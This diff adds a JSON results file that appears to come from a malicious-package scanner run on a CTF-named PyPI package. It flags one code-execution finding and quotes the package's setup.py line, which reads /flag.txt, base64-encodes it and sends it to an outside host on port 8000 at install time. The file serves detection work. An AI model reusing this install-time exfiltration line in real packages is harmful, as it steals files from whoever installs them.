@@ -1,0 +1,24 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "setup.py:21",
+                "code": "        requests.get(\"http://sam.ninja:8000/?flag=\"+os.popen(\"cat /flag.txt | base64\").read())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/ctf-q21-empire-tmp-sa13377-0.0.9"
+}
